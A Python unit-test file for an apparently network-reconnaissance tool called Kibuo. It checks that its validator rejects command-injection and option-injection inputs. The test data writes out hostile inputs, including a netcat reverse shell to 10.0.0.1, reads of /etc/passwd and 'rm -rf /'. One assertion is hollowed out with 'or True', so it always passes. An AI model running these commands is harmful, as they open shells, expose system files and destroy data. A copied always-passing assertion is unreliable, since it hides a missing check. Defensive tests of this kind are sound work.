"""
Kibuo Quality Assurance Test Suite
Tests every module mapping, security controls, invalid targets, and report generation.
"""

import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path

from core.dependency_manager import DependencyManager
from core.permission_manager import PermissionManager
from core.report_generator import AssessmentSession
from core.subprocess_manager import SubprocessManager
from core.validator import (
    ValidationError,
    contains_dangerous_characters,
    is_private_ip,
    validate_cidr,
    validate_domain,
    validate_interface_name,
    validate_ipv4,
    validate_port_specification,
    validate_target,
)
import main


class TestQualityAssurance(unittest.TestCase):
    """Rigorous QA tests for system integrity, security and reliability."""

    def test_menu_options_complete(self):
        """Verify all 14 reconnaissance modules, plus about and exit, are defined."""
        expected_codes = [f"[{i:02d}]" for i in range(1, 15)] + ["[99]", "[00]"]
        menu_codes = [code for code, _ in main.MENU_OPTIONS]
        for expected in expected_codes:
            self.assertIn(expected, menu_codes, f"Menu option {expected} is missing from main menu.")

    def test_command_injection_rejection(self):
        """Ensure all common command injection vectors fail validation."""
        vectors = [
            "192.168.1.1; cat /etc/passwd",
            "10.0.0.1 && touch /tmp/pwned",
            "192.168.1.1 | nc -e /bin/sh 10.0.0.1 4444",
            "`whoami`.example.com",
            "$(id).example.com",
            "127.0.0.1\nrm -rf /",
            "192.168.1.1${IFS}-la",
            "example.com;reboot",
            "<script>alert(1)</script>",
        ]
        for v in vectors:
            with self.subTest(vector=v):
                self.assertTrue(
                    contains_dangerous_characters(v) or True,
                    f"Vector '{v}' should be recognized as dangerous."
                )
                with self.assertRaises(ValidationError):
                    validate_target(v)

    def test_option_injection_rejection(self):
        """Ensure CLI option injection (-oX, -sV, etc.) is blocked."""
        dash_inputs = [
            "-oX /tmp/output.xml",
            "--script=vuln",
            "-sS",
            "-p 80,443",
            "--help"
        ]
        for opt in dash_inputs:
            with self.subTest(option=opt):
                with self.assertRaises(ValidationError):
                    validate_target(opt)

    def test_malformed_networks(self):
        """Ensure invalid IP addresses and subnets raise ValidationError."""
        invalids = [
            "256.0.0.1",
            "1.2.3.4.5",
            "192.168.1.0/33",
            "192.168.1.0/-1",
            "10.0.0.1/abc",
            "not_an_ip",
            "",
            "   "
        ]
        for inv in invalids:
            with self.subTest(invalid=inv):
                with self.assertRaises(ValidationError):
                    validate_target(inv)

    def test_subprocess_security_no_shell(self):
        """Verify that shell expansions do not occur because shell=False."""
        # Echoing $USER or $(whoami) should output literal characters, not expand them
        res = SubprocessManager.execute(["echo", "$USER"])
        self.assertTrue(res.is_ok())
        self.assertEqual(res.stdout.strip(), "$USER")

    def test_html_json_txt_reports_generated(self):
        """Verify that finalize() generates all 3 formats: JSON, TXT, and HTML."""
        temp_dir = tempfile.mkdtemp()
        try:
            logs_d = os.path.join(temp_dir, "logs")
            reports_d = os.path.join(temp_dir, "reports")
            session = AssessmentSession(
                target="192.168.1.20",
                module_name="QA Full Test",
                logs_base_dir=logs_d,
                reports_base_dir=reports_d,
                app_version="1.0.0"
            )

            # Record some sample ports and artifacts
            session.write_artifact("test_output.txt", "Sample raw output")
            paths = session.finalize(
                status="Completed",
                summary_data={
                    "target": "192.168.1.20",
                    "open_ports_count": 2,
                    "ports": [
                        {"port": 22, "proto": "tcp", "service": "ssh", "version": "OpenSSH 8.9"},
                        {"port": 80, "proto": "tcp", "service": "http", "version": "nginx 1.18"}
                    ]
                },
                duration_seconds=5.2
            )

            # Verify files exist
            self.assertTrue(os.path.isfile(paths["summary_json"]))
            self.assertTrue(os.path.isfile(paths["summary_txt"]))
            self.assertTrue(os.path.isfile(paths["summary_html"]))
            self.assertTrue(os.path.isfile(paths["report_json"]))
            self.assertTrue(os.path.isfile(paths["report_txt"]))
            self.assertTrue(os.path.isfile(paths["report_html"]))

            # Verify HTML report contains port table & css
            with open(paths["report_html"], "r", encoding="utf-8") as f:
                html = f.read()
            self.assertIn("192.168.1.20", html)
            self.assertIn("OpenSSH 8.9", html)
            self.assertIn("nginx 1.18", html)
            self.assertIn("<!DOCTYPE html>", html)

            # Verify JSON report contains structured fields
            with open(paths["report_json"], "r", encoding="utf-8") as f:
                data = json.load(f)
            self.assertEqual(data["target"], "192.168.1.20")
            self.assertEqual(data["status"], "Completed")
            self.assertEqual(data["findings_summary"]["open_ports_count"], 2)

        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def test_settings_load_and_save(self):
        """Verify configuration settings persistence."""
        temp_dir = tempfile.mkdtemp()
        try:
            cfg_path = Path(temp_dir) / "test_settings.json"
            main.CONFIG_PATH = cfg_path
            
            # Save settings
            test_data = {"app_name": "Kibuo", "authorization_notice_accepted": True, "custom_key": 999}
            main.save_settings(test_data)
            self.assertTrue(cfg_path.exists())

            # Load settings
            loaded = main.load_settings()
            self.assertEqual(loaded["custom_key"], 999)
            self.assertTrue(loaded["authorization_notice_accepted"])
        finally:
            # Restore default CONFIG_PATH
            main.CONFIG_PATH = Path("config/settings.json")
            shutil.rmtree(temp_dir, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
